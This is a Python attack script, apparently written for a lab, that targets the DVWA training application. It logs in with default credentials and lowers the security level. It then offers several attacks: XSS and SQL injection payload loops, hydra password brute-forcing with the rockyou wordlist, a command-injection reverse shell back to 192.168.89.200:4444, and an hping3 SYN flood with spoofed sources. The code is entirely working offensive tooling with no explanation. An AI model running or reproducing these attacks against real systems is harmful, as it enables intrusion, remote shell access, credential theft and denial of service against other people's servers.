import requests
import sys
s= requests.session()

def login(url):
    r = s.post(url+"/dvwa/login.php",data={"username":"admin","password":"password","Login":"login"})
    s.cookies.pop("security")
    s.cookies.set("security", "low", domain=url)
    print(s.cookies)

def xss_attack(target):
    with open("xss.txt",'r') as f:
        for i in f.readlines():
            r = s.get(target+"/dvwa/vulnerabilities/xss_r/?name="+i,cookies={"security":"low"})

def sqli_attack(target):
    with open("sql.txt","r") as f:
        for i in f.readlines():
            r = s.get(target+f"/dvwa/vulnerabilities/sqli/?id={i}&Submit=Submit",cookies={"security":"low"})

def password_attack(target):
    import os
    target = target.split("http://")[1]
    os.system(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=hint'")

def web_shell(target):
    shell=";bash -c \"bash -i >& /dev/tcp/192.168.89.200/4444 0>&1\""
    r =s.post(target+"/dvwa/vulnerabilities/exec/",data={"ip":shell,"submit":"submit"},cookies={"security":"low"})


def ping_of_dead(target):
    target = target.split("http://")[1]
    import os
    os.system(f"hping3 {target} -q -n -d 120 -S -p 80 --flood --rand-source")


if __name__=="__main__":

    if len(sys.argv)!=3:
        print("[+]example: python3 test.py url kind-of-attack")
        print("[+] kind of attack: sqli, xss, web_shell, password_attack, sys_flood")
        exit()
    target = sys.argv[1]
    kind = sys.argv[2]
    login(target)
    if kind=="sqli":
        sqli_attack(target)
    elif kind=="xss":
        xss_attack(target)
    elif kind=="web_shell":
        web_shell(target)
    elif kind=="password_attack":
        password_attack(target)
    elif kind =="sys_flood":
        ping_of_dead(target)
    else:
        print("we dont have that attack, pls try again")
        exit()
